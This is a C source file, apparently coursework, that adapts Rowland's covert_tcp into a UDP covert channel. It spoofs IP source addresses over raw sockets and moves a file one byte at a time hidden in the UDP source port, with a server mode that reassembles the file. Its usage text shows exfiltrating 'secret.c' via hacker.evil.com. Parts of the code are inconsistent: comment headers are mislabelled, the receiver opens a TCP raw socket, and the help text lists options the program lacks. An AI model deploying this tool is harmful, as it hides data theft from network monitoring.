/*---------------------------------------------------------------------------------------
 * SOURCE FILE:	    covert_udp
 * 
 * PROGRAM:		    covert_udp
 * 
 * FUNCTIONS:		void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short, char *, int, int, int, int);
 *                  unsigned short in_cksum(unsigned short *, int);
 *                  unsigned int host_convert(char *);
 *                  void usage(char *);
 * 
 * DATE:			September 20, 2021
 * 
 * REVISIONS:		NA
 * 
 * DESIGNERS:       Nicole Jingco
 * 
 * PROGRAMMERS:		Nicole Jingco
 * 
 * Notes:
 * This application is a modification of the Craig H. Rowland UDP Covert Channel. This 
 * program modifies the UDP header to transfer a file one byte at a time  to the destination
 * host consealing the data in the port number. This program acts as both a server and 
 * client.
 * 
 * Compile:
 * cc -o covert_udp covert_udp.c
 * 
 * Client
 * ./covert_udp -dest 192.168.1.72 -source 192.168.1.71 -source_port 323 -dest_port 323 -file sample.txt
 * 
 * Server
 * ./covert_udp -dest 192.168.1.72 -source 192.168.1.71 -source_port 323 -dest_port 323 -file sample.txt -server
 * ---------------------------------------------------------------------------------------*/
#include "covert_udp.h"

/*--------------------------------------------------------------------------
 * FUNCTION:        main
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      int argc, char **argv
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main function
 * -----------------------------------------------------------------------*/
int main(int argc, char **argv)
{
    unsigned int source_host = 0, dest_host = 0;
    unsigned short source_port = 0, dest_port = 80;
    int ipid = 0, svr = 0, file = 0;
    int count;
    char desthost[80], srchost[80], filename[80];

    /* Title */
    printf("Covert UDP %s (c)1996 Craig H. Rowland (crowland@psionic.com)\n", VERSION);
    printf("Not for commercial use without permission.\n");

    /* Can they run this? */
    if (geteuid() != 0)
    {
        printf("\nYou need to be root to run this.\n\n");
        exit(0);
    }

    /* Tell them how to use this thing */
    if ((argc < 6) || (argc > 13))
    {
        usage(argv[0]);
        exit(0);
    }

    /* No error checking on the args...next version :) */
    for (count = 0; count < argc; ++count)
    {
        if (strcmp(argv[count], "-dest") == 0)
        {
            dest_host = host_convert(argv[count + 1]);
            strncpy(desthost, argv[count + 1], 79);
        }
        else if (strcmp(argv[count], "-source") == 0)
        {
            source_host = host_convert(argv[count + 1]);
            strncpy(srchost, argv[count + 1], 79);
        }
        else if (strcmp(argv[count], "-file") == 0)
        {
            strncpy(filename, argv[count + 1], 79);
            file = 1;
        }
        else if (strcmp(argv[count], "-source_port") == 0)
            source_port = atoi(argv[count + 1]);
        else if (strcmp(argv[count], "-dest_port") == 0)
            dest_port = atoi(argv[count + 1]);
        else if (strcmp(argv[count], "-ipid") == 0)
            ipid = 1;
        else if (strcmp(argv[count], "-server") == 0)
            svr = 1;
    }

    /* check the encoding flags */
    if (ipid == 0)
        ipid = 1; /* set default encode type if none given */
    else if (ipid != 1)
    {
        printf("\n\nOnly one encoding/decode flag (-ipid -seq -ack) can be used at a time.\n\n");
        exit(1);
    }
    /* Did they give us a filename? */
    if (file != 1)
    {
        printf("\n\nYou need to supply a filename (-file <filename>)\n\n");
        exit(1);
    }

    if (svr == 0) /* if they want to be a client do this... */
    {
        if (source_host == 0 && dest_host == 0)
        {
            printf("\n\nYou need to supply a source and destination address for client mode.\n\n");
            exit(1);
        }
        else
        {
            printf("Destination Host: %s\n", desthost);
            printf("Source Host     : %s\n", srchost);
            if (source_port == 0)
                printf("Originating Port: random\n");
            else
                printf("Originating Port: %u\n", source_port);
            printf("Destination Port: %u\n", dest_port);
            printf("Encoded Filename: %s\n", filename);
            if (ipid == 1)
                printf("Encoding Type   : IP ID\n");
            printf("\nClient Mode: Sending data.\n\n");
        }
    }
    else /* server mode it is */
    {
        if (source_host == 0 && source_port == 0)
        {
            printf("You need to supply a source address and/or source port for server mode.\n");
            exit(1);
        }
        if (dest_host == 0) /* if not host given, listen for anything.. */
            strcpy(desthost, "Any Host");
        if (source_host == 0)
            strcpy(srchost, "Any Host");
        printf("Listening for data from IP: %s\n", srchost);
        if (source_port == 0)
            printf("Listening for data bound for local port: Any Port\n");
        else
            printf("Listening for data bound for local port: %u\n", source_port);
        printf("Decoded Filename: %s\n", filename);
        if (ipid == 1)
            printf("Decoding Type Is: IP packet ID\n");
        printf("\nServer Mode: Listening for data.\n\n");
    }

    /* Do the dirty work */
    forgepacket(source_host, dest_host, source_port, dest_port, filename, svr, ipid);
    exit(0);
}

/*--------------------------------------------------------------------------
 * FUNCTION:        forgepacket
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Nicole Jingco
 *
 * PROGRAMMER:     Nicole Jingco
 *
 * INTERFACE:      unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int server, int ipid, int seq, int ack
 *
 * RETURNS:        
 *
 * NOTES:
 * 
 * -----------------------------------------------------------------------*/
void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int svr, int ipid)
{
    if (svr == 0)
    {
        client(source_addr, dest_addr, source_port, dest_port, filename, ipid);
    }
    else
    {
        server(source_addr, filename, ipid);
    }

    fprintf(stdout, "\nforge packets\n\n");
}

/*--------------------------------------------------------------------------
 * FUNCTION:        forgepacket
 *
 * DATE:           Sep 20, 2021
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Nicole Jingco
 *
 * PROGRAMMER:     Nicole Jingco
 *
 * INTERFACE:      unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, char *filename, int ipid
 *
 * RETURNS:        
 *
 * NOTES:
 * Client function for consealing the message using the UDP header and
 * hiding the message in the port number
 * -----------------------------------------------------------------------*/
void client(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int ipid)
{
    int ch;
    int send_socket;
    // int src_port;
    struct sockaddr_in sin;
    FILE *input;

    if ((input = fopen(filename, "rb")) == NULL)
    {
        printf("I cannot open the file %s for reading\n", filename);
        exit(1);
    }
    else
        while ((ch = fgetc(input)) != EOF)
        {
            /* Delay loop. This really slows things down, but is necessary to ensure */
            /* semi-reliable transport of messages over the Internet and will not flood */
            /* slow network connections */
            /* A better should probably be developed */
            sleep(1);

            /* Make the IP header with our forged information */
            send_udp.ip.ihl = 5;
            send_udp.ip.version = 4;
            send_udp.ip.tos = 0;
            send_udp.ip.tot_len = htons(40);

            /* if we are NOT doing IP ID header encoding, randomize the value */
            /* of the IP identification field */
            if (ipid == 0)
                send_udp.ip.id = (int)(255.0 * rand() / (RAND_MAX + 1.0));
            // else /* otherwise we "encode" it with our cheesy algorithm */
            //     send_udp.ip.id = ch;

            // Conseal Message

            send_udp.ip.frag_off = 0;
            send_udp.ip.ttl = 64;
            send_udp.ip.protocol = IPPROTO_UDP;
            send_udp.ip.check = 0;
            send_udp.ip.saddr = source_addr;
            send_udp.ip.daddr = dest_addr;

            /* forge destination port */
            send_udp.udp.dest = htons(dest_port);

            // Conseal Message
            send_udp.udp.source = htons(ch);

            /* Drop our forged data into the socket struct */
            sin.sin_family = AF_INET;
            sin.sin_port = send_udp.udp.source;
            sin.sin_addr.s_addr = send_udp.ip.daddr;

            /* Now open the raw socket for sending */
            send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            if (send_socket < 0)
            {
                perror("send socket cannot be open. Are you root?");
                exit(1);
            }

            /* Make IP header checksum */
            send_udp.ip.check = in_cksum((unsigned short *)&send_udp.ip, 20);
            /* Final preparation of the full header */

            /* From synhose.c by knight */
            pseudo_header.source_address = send_udp.ip.saddr;
            pseudo_header.dest_address = send_udp.ip.daddr;
            pseudo_header.placeholder = 0;
            pseudo_header.protocol = IPPROTO_UDP;
            pseudo_header.udp_length = htons(8);

            bcopy((char *)&send_udp.udp, (char *)&pseudo_header.udp, 8);

            /* Final checksum on the entire package */
            send_udp.udp.check = in_cksum((unsigned short *)&pseudo_header, 32);

            /* Away we go.... */
            sendto(send_socket, &send_udp, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
            printf("Sending Data: %c\n", ch);

            close(send_socket);
        }
    fclose(input);
}

/*--------------------------------------------------------------------------
 * FUNCTION:        forgepacket
 *
 * DATE:           Sep 20, 2021
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Nicole Jingco
 *
 * PROGRAMMER:     Nicole Jingco
 *
 * INTERFACE:      unsigned int source_addr, char *filename, int ipid
 *
 * RETURNS:        
 *
 * NOTES:
 * Server function for unvealing the message from the UDP header and
 * writing the the message to a file.
 * -----------------------------------------------------------------------*/
void server(unsigned int source_addr, char *filename, int ipid)
{
    FILE *output;
    int recv_socket;

    if ((output = fopen(filename, "wb")) == NULL)
    {
        printf("I cannot open the file %s for writing\n", filename);
        exit(1);
    }

    while (1) /* read packet loop */
    {
        /* Open socket for reading */
        recv_socket = socket(AF_INET, SOCK_RAW, 6);

        if (recv_socket < 0)
        {
            perror("receive socket cannot be open. Are you root?");
            exit(1);
        }
        /* Listen for return packet on a passive socket */
        read(recv_socket, (struct recv_udp *)&recv_pkt, 9999);

        printf("Receiving Data: %c\n", recv_pkt.udp.source);
        fprintf(output, "%c", recv_pkt.udp.source);
        fflush(output);

        close(recv_socket); /* close the socket so we don't hose the kernel */
    }                       /* end while() read packet loop */

    fclose(output);
}

/*--------------------------------------------------------------------------
 * FUNCTION:       in_cksum
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      unsigned short *ptr, int nbytes
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main file that takes the user input then continues to the
 * read file
 * -----------------------------------------------------------------------*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum; /* assumes long == 32 bits */
    u_short oddbyte;
    register u_short answer; /* assumes u_short == 16 bits */

    /*
	 * Our algorithm is simple, using a 32-bit accumulator (sum),
	 * we add sequential 16-bit words to it, and at the end, fold back
	 * all the carry bits from the top 16 bits into the lower 16 bits.
	 */

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nbytes == 1)
    {
        oddbyte = 0;                            /* make sure top half is zero */
        *((u_char *)&oddbyte) = *(u_char *)ptr; /* one byte only */
        sum += oddbyte;
    }

    /*
	 * Add back carry outs from top 16 bits to low 16 bits.
	 */

    sum = (sum >> 16) + (sum & 0xffff); /* add high-16 to low-16 */
    sum += (sum >> 16);                 /* add carry */
    answer = ~sum;                      /* ones-complement, then truncate to 16 bits */
    return (answer);
}

/*--------------------------------------------------------------------------
 * FUNCTION:       host_convert
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      char *hostname
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main file that takes the user input then continues to the
 * read file
 * -----------------------------------------------------------------------*/
unsigned int host_convert(char *hostname)
{
    static struct in_addr i;
    struct hostent *h;
    i.s_addr = inet_addr(hostname);
    if (i.s_addr == -1)
    {
        h = gethostbyname(hostname);
        if (h == NULL)
        {
            fprintf(stderr, "cannot resolve %s\n", hostname);
            exit(0);
        }
        bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
    }
    return i.s_addr;
}

/*--------------------------------------------------------------------------
 * FUNCTION:        usage
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      char *progname
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main file that takes the user input then continues to the
 * read file
 * -----------------------------------------------------------------------*/
void usage(char *progname)
{
    printf("Covert UDP usage: \n%s -dest dest_ip -source source_ip -file filename -source_port port -dest_port port -server [encode type]\n\n", progname);
    printf("-dest dest_ip      - Host to send data to.\n");
    printf("-source source_ip  - Host where you want the data to originate from.\n");
    printf("                     In SERVER mode this is the host data will\n");
    printf("                     be coming FROM.\n");
    printf("-source_port port  - IP source port you want data to appear from. \n");
    printf("                     (randomly set by default)\n");
    printf("-dest_port port    - IP source port you want data to go to. In\n");
    printf("                     SERVER mode this is the port data will be coming\n");
    printf("                     inbound on. Port 80 by default.\n");
    printf("-file filename     - Name of the file to encode and transfer.\n");
    printf("-server            - Passive mode to allow receiving of data.\n");
    printf("[Encode Type] - Optional encoding type\n");
    printf("-ipid - Encode data a byte at a time in the IP packet ID. [DEFAULT]\n");
    printf("-seq  - Encode data a byte at a time in the packet sequence number.\n");
    printf("-ack  - DECODE data a byte at a time from the ACK field.\n");
    printf("        This ONLY works from server mode and is made to decode\n");
    printf("        covert channel packets that have been bounced off a remote\n");
    printf("        server using -seq. See documentation for details\n");
    printf("\nPress ENTER for examples.");
    getchar();
    printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -source_port 1234 -dest_port 80 -file secret.c\n\n");
    printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
    printf("at a time using the default IP packet ID encoding.\n");
    printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -dest_port 80 -server -file secret.c\n\n");
    printf("Above listens passively for packets from  hacker.evil.com\n");
    printf("destined for port 80. It takes the data and saves the file locally\n");
    printf("as secret.c\n\n");
    exit(0);
}
